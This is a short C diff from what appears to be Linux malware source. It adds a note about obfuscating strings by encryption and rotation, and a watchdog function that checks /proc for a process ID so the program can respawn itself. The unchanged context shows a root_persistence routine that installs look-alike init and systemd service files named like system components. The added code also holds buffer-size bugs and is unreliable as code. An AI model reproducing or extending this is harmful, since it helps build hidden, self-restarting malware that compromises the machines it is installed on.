@@ -101,6 +101,7 @@ bool root_persistence(void) {
     bool result;
     char *fpath;
 
+    // TODO - stack strings, encrypt+rotate
     char *init_path_1 = "/etc/init/systemd-agent.conf";
     char *systemd_path_1 = "/lib/systemd/system/sys-temd-agent.service";
 
@@ -117,4 +118,27 @@ bool root_persistence(void) {
 
     free(fpath);
     return result;
+}
+
+
+bool monitor_proc(int pid) {
+
+    char *procpath = "/proc/";
+    char *tmppid = malloc(sizeof(pid));
+    sprintf(tmppid, "%d", pid); //tmppid == pid
+
+    int size_procpath = strlen(procpath) + strlen(tmppid);
+    char *finalpath = (char *)malloc(size_procpath);
+
+    strncpy(finalpath, procpath, strlen(procpath));
+    strncat(finalpath, tmppid, strlen(tmppid));
+    // variable finalpath is now /proc/<PID>
+
+    free(tmppid);
+    int res = access(finalpath, F_OK);
+    if (res == 0 ) {
+        return true; // file exists
+    } else {
+        return false; // file does not exists, respawn program
+    }
 }
